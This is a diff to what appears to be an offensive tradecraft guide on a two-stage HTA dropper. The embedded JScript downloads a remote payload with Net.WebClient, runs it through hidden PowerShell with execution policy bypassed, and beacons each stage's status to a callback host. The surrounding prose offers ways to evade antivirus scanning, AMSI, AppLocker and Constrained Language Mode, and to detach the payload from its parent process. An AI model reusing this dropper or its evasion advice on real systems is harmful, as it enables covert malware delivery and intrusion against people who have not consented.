@@ -538,15 +538,13 @@ Four questions, line by line in the web log:
 3. Is there `GET /shell.ps1`? No → the stage-1 command never reached download.
 4. Is there a callback? No, but 1–3 all yes → the break is between download and execute.
 
-The split HTA does `WScript.Shell.Run(downloadCmd, 0, true)` (`true` = wait for that process to exit), checks the file exists, echoes `download-done`, then `Run(execCmd, 0, true)` and echoes `exec-done`. A 2–5 second `WScript.Sleep` between stages gives realtime scanners a release window.
-
-<!-- VERIFY: m02-hta-download-exec-split.hta calls WScript.Sleep inside mshta. WScript is a WSH global and is often undefined in HTA; if the sleep throws, replace it with a setTimeout/busy-wait or run the same split logic under cscript. -->
+The split HTA does `WScript.Shell.Run(downloadCmd, 0, true)` (`true` = wait for that process to exit), checks the file exists, echoes `download-done`, then `Run(execCmd, 0, true)` and echoes `exec-done`. A 2–5 second `window.setTimeout` between stages provides a diagnostic delay; it does not guarantee that a scanner has released the file. `WScript.Sleep` is unavailable in mshta (the `WScript.Shell` COM object is separate and still works).
 
 If stage 1 fails, the download command quotes or proxy are wrong — try `certutil.exe -urlcache -split -f URL OUT` or `bitsadmin.exe /transfer`, or set an explicit PowerShell proxy. If stage 1 is OK and stage 2 fails, the exec path is limited (CLM/AppLocker/AV) — switch exec to InstallUtil /U or a custom Runspace IEX, and keep download split. If both stages succeed alone but one combined command fails, stop trying one-liners: stay two-stage, or put two `Run`s in one `.hta` with `start /wait` semantics each, and Base64 the PowerShell with `-enc` so the command has one quote layer.
 
 Only when the logs show every stage succeeded, the split succeeds, and only the merge fails should AV/AMSI become a candidate — then retry with the combined-chain AMSI handling and shorter commands.
 
-If you suspect a scan race, use a fixed `WScript.Sleep(2000~5000)` or poll until the file is readable, then exec. If `window.close()` / `self.close()` takes children with it, launch exec via `schtasks` or `wmic process call create` so it leaves the host process tree (check AppLocker allowlists). Prefer writing under `C:\Windows\Tasks` or `%TEMP%`.
+If you suspect a scan race, use a fixed `window.setTimeout` delay (2000–5000 ms) or poll until the file is readable, then exec. If `window.close()` / `self.close()` takes children with it, launch exec via `schtasks` or `wmic process call create` so it leaves the host process tree (check AppLocker allowlists). Prefer writing under `C:\Windows\Tasks` or `%TEMP%`.
 
 ::: details `m02-hta-download-exec-split.hta` · click to expand
 
@@ -609,26 +607,29 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
              "\"(New-Object Net.WebClient).DownloadFile('" + URL + "','" + OUT + "')\"";
     var rc1 = sh.Run(dl, 0, true);
 
-    // Leave a window for realtime scanners/AV: file just written may still be
-    // under scan; executing immediately often fails
-    WScript.Sleep(3000);
+    // HTA is not Windows Script Host: delay the continuation with a browser timer.
+    // Keep the window alive until the continuation finishes.
+    window.setTimeout(finishStages, 3000);
 
-    if (rc1 !== 0) {
-        beacon("/cb?stage=download-fail&rc=" + rc1);
-    } else if (!fileExists(OUT)) {
-        beacon("/cb?stage=download-fail&reason=no-file");
-    } else {
-        beacon("/cb?stage=download-done&size=" + fileSize(OUT));
-        // ---- Stage 2: only after the file is confirmed, execute separately ----
-        // Choose exec by dropped file type:
-        //  .ps1 -> powershell -File (needs no CLM/script-rule limits; if limited,
-        //         switch to InstallUtil/Runspace)
-        //  .exe -> Run directly or InstallUtil.exe /U (AppLocker case; see
-        //         m02-hta-embedded-clm-bypass.hta)
-        var ex = "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File " + "\"" + OUT + "\"";
-        var rc2 = sh.Run(ex, 0, true);
-        if (rc2 !== 0) { beacon("/cb?stage=exec-fail&rc=" + rc2); }
-        else           { beacon("/cb?stage=exec-done"); }
+    function finishStages() {
+        if (rc1 !== 0) {
+            beacon("/cb?stage=download-fail&rc=" + rc1);
+        } else if (!fileExists(OUT)) {
+            beacon("/cb?stage=download-fail&reason=no-file");
+        } else {
+            beacon("/cb?stage=download-done&size=" + fileSize(OUT));
+            // ---- Stage 2: only after the file is confirmed, execute separately ----
+            // Choose exec by dropped file type:
+            //  .ps1 -> powershell -File (needs no CLM/script-rule limits; if limited,
+            //         switch to InstallUtil/Runspace)
+            //  .exe -> Run directly or InstallUtil.exe /U (AppLocker case; see
+            //         m02-hta-embedded-clm-bypass.hta)
+            var ex = "powershell.exe -nop -w hidden -ExecutionPolicy Bypass -File " + "\"" + OUT + "\"";
+            var rc2 = sh.Run(ex, 0, true);
+            if (rc2 !== 0) { beacon("/cb?stage=exec-fail&rc=" + rc2); }
+            else           { beacon("/cb?stage=exec-done"); }
+        }
+        window.close();
     }
     // Log conclusions: download-fail = download link issue (quotes/proxy/URL);
     //               download-done + exec-fail = exec path limited — switch to
@@ -638,7 +639,7 @@ Test status: Not Windows-lab tested (this host is macOS); JScript syntax hand-re
 </script>
 </head>
 <body>
-<script language="JScript">window.close();</script>
+<!-- Closed by finishStages after the timer and stage checks complete. -->
 </body>
 </html>
 ````
